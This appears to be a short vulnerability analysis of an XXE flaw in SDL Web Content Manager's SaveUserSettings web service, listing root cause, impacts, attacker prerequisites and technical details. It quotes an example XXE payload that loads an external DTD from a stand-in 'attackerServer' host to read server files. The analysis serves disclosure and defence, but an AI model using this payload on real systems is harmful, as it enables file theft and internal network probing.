Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause of Vulnerability:**
The vulnerability stems from the SDL Web Content Manager's `SaveUserSettings` web service accepting and processing XML data without proper sanitization, specifically failing to disable or restrict XML External Entity (XXE) processing.

**Weaknesses/Vulnerabilities Present:**
- **XML External Entity Injection (XXE):** The application allows the inclusion of external entities within the XML data it processes. This is a classic XXE vulnerability.

**Impact of Exploitation:**
- **Sensitive File Disclosure:** An attacker can use the XXE vulnerability to read arbitrary files from the server's file system.
- **Internal Network Port Scanning:** The attacker can leverage the server's ability to fetch external resources to perform port scans of the internal network.
- **Potential Server-Side Request Forgery (SSRF):** Although not explicitly stated, the ability to make requests to internal resources can potentially lead to SSRF.

**Attack Vectors:**
- The attack vector is through the `SaveUserSettings` web service, which takes XML data as a parameter.

**Required Attacker Capabilities/Position:**
- **Access to the application:** The attacker needs a user account to access the vulnerable web service.
- **Ability to intercept and modify web requests:** The attacker needs to be able to intercept and modify the HTTP requests to inject the malicious XML payload (e.g., using a proxy tool like Burp Suite).
- **Control over an external server:** The attacker needs to have an accessible server to host the malicious DTD file and act as a listener for the server's request.

**Technical Details:**
- The attacker injects a crafted XML payload that references an external DTD file hosted on the attacker's server. This DTD file is used to trigger the retrieval of local files.
- Example payload: `<!DOCTYPE cdl [<!ENTITY % asd SYSTEM \"http://attackerServer/xxe1.dtd\">%asd;%c;]> <cdl>&rrr;</cdl>`
- The server fetches the external DTD and parses it, which allows the attacker to read server files or perform other malicious activities.
